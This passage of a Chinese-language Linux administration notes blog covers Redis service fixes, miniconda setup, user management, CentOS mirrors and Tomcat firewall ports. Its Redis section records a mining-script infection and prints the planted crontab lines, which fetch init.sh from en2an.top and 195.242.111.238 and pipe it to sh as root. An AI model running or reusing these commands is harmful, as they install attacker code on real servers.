<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>root@mrwang redis-4.0.9<span class="o">]</span><span class="c1"># vim /etc/sysctl.conf </span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@mrwang redis-4.0.9<span class="o">]</span><span class="c1"># sysctl -p            </span>
</span></span><span class="line"><span class="cl">vm.swappiness <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">kernel.sysrq <span class="o">=</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">net.ipv4.neigh.default.gc_stale_time <span class="o">=</span> <span class="m">120</span>
</span></span><span class="line"><span class="cl">net.ipv4.conf.all.rp_filter <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">net.ipv4.conf.default.rp_filter <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">net.ipv4.conf.default.arp_announce <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">net.ipv4.conf.lo.arp_announce <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">net.ipv4.conf.all.arp_announce <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">net.ipv4.tcp_max_tw_buckets <span class="o">=</span> <span class="m">5000</span>
</span></span><span class="line"><span class="cl">net.ipv4.tcp_syncookies <span class="o">=</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">net.ipv4.tcp_max_syn_backlog <span class="o">=</span> <span class="m">1024</span>
</span></span><span class="line"><span class="cl">net.ipv4.tcp_synack_retries <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">net.core.somaxconn <span class="o">=</span> <span class="m">1024</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>systemctl status redis-server</code> 报错</p>
<blockquote>
<p>redis-server.service: Can&rsquo;t open PID file /var/run/redis/redis-server.pid (yet?) after start: No such file or directory</p>
</blockquote>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341759.png" alt="image-20220801100028038"  />
</p>
<p>解决方法如下：</p>
<p><a href="https://blog.csdn.net/zhangpeterx/article/details/104093275">https://blog.csdn.net/zhangpeterx/article/details/104093275</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">vi /usr/lib/systemd/system/redis.service <span class="c1">#centos 7</span>
</span></span><span class="line"><span class="cl">nano /etc/systemd/system/redis.service  <span class="c1">#debian/ubuntu</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>[Service]</code>下新增一行<code>ExecStartPost=/bin/sh -c &quot;echo $MAINPID &gt; /var/run/redis/redis.pid&quot;</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>forking
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/bin/redis-server /etc/redis/redis.conf
</span></span><span class="line"><span class="cl"><span class="nv">ExecStop</span><span class="o">=</span>/bin/kill -s TERM <span class="nv">$MAINPID</span>
</span></span><span class="line"><span class="cl"><span class="nv">ExecStartPost</span><span class="o">=</span>/bin/sh -c <span class="s2">&#34;echo </span><span class="nv">$MAINPID</span><span class="s2"> &gt; /var/run/redis/redis.pid&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>随后重启服务：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo systemctl daemon-reload
</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> redis-server
</span></span><span class="line"><span class="cl">sudo systemctl restart redis.service
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>redis运行时日志报错</strong></p>
<p>==Redis被挖矿脚本注入了！！！==</p>
<blockquote>
<p>3543227:M 01 Aug 2022 21:27:36.031 * 1 changes in 900 seconds. Saving&hellip;
3543227:M 01 Aug 2022 21:27:36.031 * Background saving started by pid 3604362
3604362:C 01 Aug 2022 21:27:36.031 # Failed opening the RDB file crontab (in server root dir /etc) for saving: Read-only file system
3543227:M 01 Aug 2022 21:27:36.131 # Background saving error</p>
</blockquote>
<p><a href="https://blog.csdn.net/zhangjunli/article/details/103817837">https://blog.csdn.net/zhangjunli/article/details/103817837</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@VM-0-10-ubuntu:/etc/redis# redis-cli
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config get dir
</span></span><span class="line"><span class="cl">1<span class="o">)</span> <span class="s2">&#34;dir&#34;</span>
</span></span><span class="line"><span class="cl">2<span class="o">)</span> <span class="s2">&#34;/etc&#34;</span>
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /var/lib/redis
</span></span><span class="line"><span class="cl">OK
</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config get dir
</span></span><span class="line"><span class="cl">1<span class="o">)</span> <span class="s2">&#34;dir&#34;</span>
</span></span><span class="line"><span class="cl">2<span class="o">)</span> <span class="s2">&#34;/var/lib/redis&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341774.png" alt="image-20220803141824317"  />
</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh
</span></span><span class="line"><span class="cl">*/3 * * * * root wget -q -O- http://en2an.top/cleanfda/init.sh | sh
</span></span><span class="line"><span class="cl">*/4 * * * * root curl -fsSL http://195.242.111.238/cleanfda/init.sh | sh
</span></span><span class="line"><span class="cl">*/5 * * * * root wd1 -q -O- http://195.242.111.238/cleanfda/init.sh | sh
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="linux管理python推荐使用minicondahttpsdocscondaioenlatestminicondahtml">Linux管理python推荐使用<a href="https://docs.conda.io/en/latest/miniconda.html">miniconda</a><a hidden class="anchor" aria-hidden="true" href="#linux管理python推荐使用minicondahttpsdocscondaioenlatestminicondahtml">#</a></h3>
<p>安装miniconda</p>
<p><a href="https://www.jianshu.com/p/47ed480daccc">https://www.jianshu.com/p/47ed480daccc</a></p>
<p>1、下载最新版 miniconda：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">wget</span> <span class="nl">https</span><span class="p">:</span><span class="c1">//repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>2、在bash中安装：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">sh</span> <span class="nt">Miniconda3-latest-Linux-x86_64</span><span class="p">.</span><span class="nc">sh</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>3、安装完成后，关闭terminal后，重新打开，输入以下命令以验证是否安装成功：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">conda -V
</span></span></code></pre></td></tr></table>
</div>
</div><p>4、若要卸载，可直接删除已安装的文件夹后，并删除相应的环境变量：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm -rf /usr/local/miniconda/
</span></span><span class="line"><span class="cl">rm -rf /usr/local/anaconda/
</span></span></code></pre></td></tr></table>
</div>
</div><p>删除后，打开 ~/.bashrc 文件，删除以下conda的路径变量：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34; /usr/local/anaconda/bin:</span><span class="nv">$PATH</span><span class="s2">&#34;</span> 
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34; /usr/local/miniconda3/bin:</span><span class="nv">$PATH</span><span class="s2">&#34;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341997.png" alt="image-20220603162231450"  />
</p>
<p><strong>解决方案：</strong></p>
<p>打开一个终端，然后输入命令行打开bashrc文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo gedit ~/.bashrc
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意这里要有sudo，不然无法编辑里面的内容。</p>
<p>打开自己的安装目录<code>/opt/software/miniconda3/bin</code>，输入指令<code>pwd</code>查看路径。</p>
<p>在bashrc文件中输入：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/opt/software/miniconda3/bin:</span><span class="nv">$PATH</span><span class="s2">&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>保存关闭bashrc文件，在命令行输入：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">source</span> ~/.bashrc
</span></span></code></pre></td></tr></table>
</div>
</div><p>随后检测一下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">conda --version
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341014.png" alt="image-20220603163426669"  />
</p>
<p>如上图所示，成功。</p>
<p><strong>常用指令</strong></p>
<p>conda activate GIS</p>
<p>conda create -n Name python=3.x(2.x)</p>
<p>conda install xx (pip install xx)</p>
<p>conda deactivate</p>
<h3 id="新建用户">新建用户<a hidden class="anchor" aria-hidden="true" href="#新建用户">#</a></h3>
<p><code>如下操作都是在root用户下进行的</code></p>
<h4 id="新增单个用户">新增单个用户<a hidden class="anchor" aria-hidden="true" href="#新增单个用户">#</a></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">useradd user1
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">passwd user1
</span></span></code></pre></td></tr></table>
</div>
</div><p>设置密码的时候，有的密码无法通过字典检查。
可以通过修改：<code>/etc/security/pwquality.conf</code> 文件 关闭字典检查。</p>
<p>修改完成之后：
<img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341029.png" alt="在这里插入图片描述"  />
</p>
<p><strong>但是不建议这么修改。建议换个密码。</strong></p>
<h4 id="删除帐号">删除帐号<a hidden class="anchor" aria-hidden="true" href="#删除帐号">#</a></h4>
<p>删除一个已有的用户账号使用<code>userdel</code>命令，其格式如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">userdel 选项 用户名
</span></span></code></pre></td></tr></table>
</div>
</div><p>常用的选项是 <strong>-r</strong>，它的作用是把用户的主目录一起删除。</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># userdel -r sam
</span></span></code></pre></td></tr></table>
</div>
</div><p>此命令删除用户sam在系统文件中（主要是/etc/passwd, /etc/shadow, /etc/group等）的记录，同时删除用户的主目录。</p>
<p><strong>/etc/passwd文件是用户管理工作涉及的最重要的一个文件。</strong></p>
<p>Linux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">＃ cat /etc/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root❌0:0:Superuser:/:
</span></span><span class="line"><span class="cl">daemon❌1:1:System daemons:/etc:
</span></span><span class="line"><span class="cl">bin❌2:2:Owner of system commands:/bin:
</span></span><span class="line"><span class="cl">sys❌3:3:Owner of system files:/usr/sys:
</span></span><span class="line"><span class="cl">adm❌4:4:System accounting:/usr/adm:
</span></span><span class="line"><span class="cl">uucp❌5:5:UUCP administrator:/usr/lib/uucp:
</span></span><span class="line"><span class="cl">auth❌7:21:Authentication administrator:/tcb/files/auth:
</span></span><span class="line"><span class="cl">cron❌9:16:Cron daemon:/usr/spool/cron:
</span></span><span class="line"><span class="cl">listen❌37:4:Network daemon:/usr/net/nls:
</span></span><span class="line"><span class="cl">lp❌71:18:Printer administrator:/usr/spool/lp:
</span></span><span class="line"><span class="cl">sam❌200:50:Sam san:/home/sam:/bin/sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>从上面的例子我们可以看到，/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="添加批量用户">添加批量用户<a hidden class="anchor" aria-hidden="true" href="#添加批量用户">#</a></h4>
<p>（1）先编辑一个文本用户文件。</p>
<p>每一列按照<code>/etc/passwd</code>密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user001::600:100:user:/home/user001:/bin/bash
</span></span><span class="line"><span class="cl">user002::601:100:user:/home/user002:/bin/bash
</span></span><span class="line"><span class="cl">user003::602:100:user:/home/user003:/bin/bash
</span></span><span class="line"><span class="cl">user004::603:100:user:/home/user004:/bin/bash
</span></span><span class="line"><span class="cl">user005::604:100:user:/home/user005:/bin/bash
</span></span><span class="line"><span class="cl">user006::605:100:user:/home/user006:/bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>（2）以root身份执行命令 <code>/usr/sbin/newusers</code>，从刚创建的用户文件<code>user.txt</code>中导入数据，创建用户：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># newusers &lt; user.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后可以执行命令 <code>vipw</code> 或 <code>vi /etc/passwd</code> 检查 <code>/etc/passwd</code> 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。</p>
<p>（3）执行命令/usr/sbin/pwunconv。</p>
<p>将 <code>/etc/shadow</code> 产生的 <code>shadow</code> 密码解码，然后回写到 <code>/etc/passwd</code> 中，并将<code>/etc/shadow</code>的<code>shadow</code>密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 <code>shadow password</code> 功能。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># pwunconv
</span></span></code></pre></td></tr></table>
</div>
</div><p>（4）编辑每个用户的密码对照文件。</p>
<p>格式为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用户名:密码
</span></span></code></pre></td></tr></table>
</div>
</div><p>实例文件 <code>passwd.txt</code> 内容如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user001:123456
</span></span><span class="line"><span class="cl">user002:123456
</span></span><span class="line"><span class="cl">user003:123456
</span></span><span class="line"><span class="cl">user004:123456
</span></span><span class="line"><span class="cl">user005:123456
</span></span><span class="line"><span class="cl">user006:123456
</span></span></code></pre></td></tr></table>
</div>
</div><p>（5）以 root 身份执行命令 <code>/usr/sbin/chpasswd</code>。</p>
<p>创建用户密码，<code>chpasswd</code> 会将经过 <code>/usr/bin/passwd</code> 命令编码过的密码写入 <code>/etc/passwd</code> 的密码栏。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># chpasswd &lt; passwd.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>（6）确定密码经编码写入/etc/passwd的密码栏后。</p>
<p>执行命令 <code>/usr/sbin/pwconv</code> 将密码编码为 <code>shadow password</code>，并将结果写入 <code>/etc/shadow</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># pwconv
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。</p>
<h2 id="centos">Centos<a hidden class="anchor" aria-hidden="true" href="#centos">#</a></h2>
<h3 id="换国内源">换国内源<a hidden class="anchor" aria-hidden="true" href="#换国内源">#</a></h3>
<p><a href="https://blog.csdn.net/sinat_31089473/article/details/105929293">https://blog.csdn.net/sinat_31089473/article/details/105929293</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">备份一份文件
</span></span><span class="line"><span class="cl">cp /etc/yum.repos.d/CentOS-Base.repo.backup /etc/yum.repos.d/CentOS-Base.repo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">下载国内源
</span></span><span class="line"><span class="cl">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">生成缓存
</span></span><span class="line"><span class="cl">yum makecache
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装java-1">安装Java<a hidden class="anchor" aria-hidden="true" href="#安装java-1">#</a></h3>
<p><a href="https://www.cnblogs.com/lumama520/p/11058927.html">https://www.cnblogs.com/lumama520/p/11058927.html</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">解压压缩包
</span></span><span class="line"><span class="cl">tar -zxvf /home/binbin/jdk-8u301-linux-x64.tar.gz -C /usr/local/java/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">配置环境变量
</span></span><span class="line"><span class="cl">vim /etc/profile
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">使环境变量生效
</span></span><span class="line"><span class="cl"><span class="nb">source</span> /etc/profile
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">检查Java版本
</span></span><span class="line"><span class="cl">java -version
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装tomcat-1">安装Tomcat<a hidden class="anchor" aria-hidden="true" href="#安装tomcat-1">#</a></h3>
<p><a href="https://blog.csdn.net/qq_21077715/article/details/85541685">https://blog.csdn.net/qq_21077715/article/details/85541685</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">新建文件夹
</span></span><span class="line"><span class="cl">mkdir usr/local/tomcat9
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">解压压缩包
</span></span><span class="line"><span class="cl">tar -zxvf /home/binbin/apache-tomcat-9.0.54.tar.gz -C /usr/local/tomcat9/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">启动tomcat
</span></span><span class="line"><span class="cl">/usr/local/tomcat9/apache-tomcat-9.0.54/bin/startup.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">开放防火墙端口
</span></span><span class="line"><span class="cl">firewall-cmd --zone<span class="o">=</span>public --add-port<span class="o">=</span>8080/tcp --permanent
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">firewall-cmd --reload
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">查看防火墙信息
</span></span><span class="line"><span class="cl">firewall-cmd --list-all
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="开放对外端口">开放对外端口<a hidden class="anchor" aria-hidden="true" href="#开放对外端口">#</a></h3>
<p>==注意：centos7自带的防火墙已经不是<strong>iptables</strong>了，改成了<strong>firewalld</strong>==  <a href="https://www.niuqi360.com/lamp-config/setup-ufw-on-centos7/">ufw也是一种防火墙</a></p>
<p>执行命令时，出现firewalld is not running的报错，用以下命令将firewalld起起来即可</p>
<p>1.查看firewalld状态：<code>systemctl status firewalld</code>，如果是dead状态，即防火墙未开启。</p>
<p>2.开启防火墙：<code>systemctl start firewalld</code></p>
<p>3.确认firewalld状态:<code>systemctl status firewalld</code></p>
<p>4.开放默认端口号 3306，出现success表示成功</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">firewall-cmd --permanent --zone<span class="o">=</span>public --add-port<span class="o">=</span>3306/tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.重新加载防火墙配置：<code>firewall-cmd --reload</code></p>
<p>6.设置firewalld开机启动：<code>systemctl enable firewalld</code></p>
<p>7.关闭防火墙：<code>systemctl stop firewalld</code></p>
<p>8.查看该机器有几个端口开放：<code>firewall-cmd --list-all</code>、<code>firewall-cmd --zone=public --list-ports</code></p>
<p><strong>经过上述操作后外网还是访问不到tomcat</strong></p>
<p><strong>可能是服务没开？</strong></p>
<p><a href="https://www.cnblogs.com/cui0614/p/12746383.html">https://www.cnblogs.com/cui0614/p/12746383.html</a></p>
<p>但是开了之后还不行</p>
<p><strong>==主要原因是我是在腾讯云上买的服务器，所以要在腾讯云上面先开端口号~！！！！==</strong></p>
<p><img loading="lazy" src="https://blog-images-1301988137.cos.ap-nanjing.myqcloud.com/blog/2207/202307252341045.png" alt="image-20211012213221481"  />
</p>
<p>因为centos7自带的防火墙已经不是<strong>iptables</strong>了，改成了<strong>firewalld</strong>，所以不用下面的这种方法解决</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># Generated by iptables-save v1.4.7 on Tue Aug 20 10:09:45 2019</span>
</span></span><span class="line"><span class="cl">*filter
</span></span><span class="line"><span class="cl">:INPUT ACCEPT <span class="o">[</span>0:0<span class="o">]</span>
